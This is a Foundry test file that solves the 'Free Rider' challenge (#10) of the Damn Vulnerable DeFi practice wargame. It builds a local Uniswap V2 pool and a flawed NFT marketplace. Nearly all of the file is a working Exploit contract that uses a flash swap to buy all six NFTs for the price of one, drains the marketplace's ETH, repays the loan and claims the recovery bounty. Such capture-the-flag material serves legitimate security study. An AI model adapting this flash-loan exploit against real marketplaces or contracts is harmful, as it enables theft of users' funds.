// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/WETH.sol";
import "src/DamnValuableToken.sol";
import "src/DamnValuableNFT.sol";

import "src/FreeRider/FreeRiderRecovery.sol";
import "src/FreeRider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Factory, IUniswapV2Pair, IUniswapV2Router02} from "src/FreeRider/Interfaces.sol";
import "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

// Challenge #10 - Free Rider
// https://www.damnvulnerabledefi.xyz/challenges/free-rider/

contract Attack is Test {
    WETH public weth;
    DamnValuableToken public token;
    DamnValuableNFT public nft;
    IUniswapV2Factory public uniswapV2Factory;
    IUniswapV2Router02 public uniswapV2Router;
    IUniswapV2Pair public uniswapV2Pair;
    FreeRiderNFTMarketplace public marketPlace;
    FreeRiderRecovery public recovery;

    address public deployer = payable(address(uint160(uint256(keccak256(abi.encodePacked("deployer"))))));
    address public recoverer = payable(address(uint160(uint256(keccak256(abi.encodePacked("recoverer"))))));
    address public hacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("hacker"))))));

    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 public constant NFT_PRICE = 15 * 1e18;
    uint256 public constant AMOUNT_OF_NFTS = 6;
    uint256 public constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 * 1e18;

    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 1 * 1e17;

    uint256 public constant RECOVERER_PAYOUT = 45 * 1e18;

    // Initial reserves for the Uniswap v2 pool
    uint256 public constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000 * 1e18;
    uint256 public constant UNISWAP_INITIAL_WETH_RESERVE = 9000 * 1e18;

    function setUp() public {
        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);
        vm.deal(recoverer, RECOVERER_PAYOUT);
        vm.deal(hacker, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(hacker.balance, PLAYER_INITIAL_ETH_BALANCE);

        weth = new WETH();

        vm.startPrank(deployer);
        token = new DamnValuableToken();

        uniswapV2Factory =
            IUniswapV2Factory(deployCode("./src/FreeRider/build-uniswap-v2/UniswapV2Factory.json", abi.encode(0x0)));
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/FreeRider/build-uniswap-v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), UNISWAP_INITIAL_TOKEN_RESERVE, 0, 0, deployer, block.timestamp * 2
        );

        uniswapV2Pair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));
        assertEq(uniswapV2Pair.token0(), address(token));
        assertEq(uniswapV2Pair.token1(), address(weth));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        marketPlace = new FreeRiderNFTMarketplace{ value: MARKETPLACE_INITIAL_ETH_BALANCE }(AMOUNT_OF_NFTS);
        nft = DamnValuableNFT(marketPlace.token());
        assertEq(nft.owner(), address(0x0));
        assertEq(nft.rolesOf(address(marketPlace)), nft.MINTER_ROLE());

        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        nft.setApprovalForAll(address(marketPlace), true);

        uint256[] memory offerId = new uint256[](6);
        uint256[] memory offerPrice = new uint256[](6);
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            offerId[id] = id;
            offerPrice[id] = NFT_PRICE;
        }
        marketPlace.offerMany(offerId, offerPrice);
        assertEq(marketPlace.offersCount(), AMOUNT_OF_NFTS);

        vm.stopPrank();

        vm.startPrank(recoverer);

        recovery = new FreeRiderRecovery{ value: RECOVERER_PAYOUT }(hacker, address(nft));

        vm.stopPrank();
    }

    function testExploit() public {
        // Attack Code:
        vm.startPrank(hacker);
        Exploit exploit = new Exploit{value:0.05 ether}(uniswapV2Pair, marketPlace, recovery, weth, nft, hacker);
        exploit.flashSwap();
        vm.stopPrank();

        vm.startPrank(hacker, hacker);
        for (uint256 i = 0; i < 6; i++) {
            exploit.transferNft(i);
        }
        vm.stopPrank();

        // ------ Test ------

        // The recoverer extract all NFTs from its associated contract
        vm.startPrank(recoverer);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            nft.transferFrom(address(recovery), recoverer, tokenId);
            assertEq(nft.ownerOf(tokenId), recoverer);
        }
        vm.stopPrank();

        // marketPlace must lost ETH and NFTs
        assertEq(marketPlace.offersCount(), 0);
        assertLt(address(marketPlace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // hacker must have earned all ETH from the payout
        assertGt(hacker.balance, RECOVERER_PAYOUT);
        assertEq(address(recovery).balance, 0);
    }
}

// ------ Interface ------

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

// ------ ------

contract Exploit is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair public uniswapV2Pair;
    FreeRiderNFTMarketplace public marketPlace;
    FreeRiderRecovery public recovery;
    WETH public weth;
    DamnValuableNFT public nft;

    address public hacker;
    uint256 public amount = 15 ether;
    uint256[] public tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        IUniswapV2Pair _uniswapV2Pair,
        FreeRiderNFTMarketplace _marketPlace,
        FreeRiderRecovery _recovery,
        WETH _weth,
        DamnValuableNFT _nft,
        address _hacker
    ) payable {
        uniswapV2Pair = _uniswapV2Pair;
        marketPlace = _marketPlace;
        recovery = _recovery;
        weth = _weth;
        nft = _nft;
        hacker = _hacker;
    }

    function flashSwap() public {
        bytes memory data = abi.encode(amount);
        uniswapV2Pair.swap(0, amount, address(this), data);
    }

    function uniswapV2Call(address, uint256, uint256 amount0, bytes calldata) external {
        weth.withdraw(amount0);
        marketPlace.buyMany{value: amount0}(tokens);
        uint256 amount0Adjusted = (amount0 * 103) / 100;
        weth.deposit{value: amount0Adjusted}();
        weth.transfer(msg.sender, amount0Adjusted);
    }

    function transferNft(uint256 id) public {
        bytes memory data = abi.encode(hacker);
        nft.safeTransferFrom(address(this), address(recovery), id, data);
    }

    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
